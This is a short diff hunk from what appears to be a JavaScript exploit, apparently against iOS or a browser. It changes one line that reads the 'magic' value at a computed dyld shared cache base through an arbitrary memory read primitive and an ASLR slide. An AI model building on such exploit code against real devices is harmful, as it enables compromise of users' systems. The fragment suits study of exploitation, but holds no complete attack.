@@ -501,7 +501,7 @@ function exploit(){
 	    log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
 	    tmp = base;
 	    var dcache_base = Add(0x180000000,slide);
-	    var magic =  memory.u32(dcache_base + 0x14);
+	    var magic =  memory.u32(dcache_base);
 	    log('[+] Which has magic '+magic.toString(16));
 	   // memory.read_i32(magic);
 	    //log('magic = ' + magic);
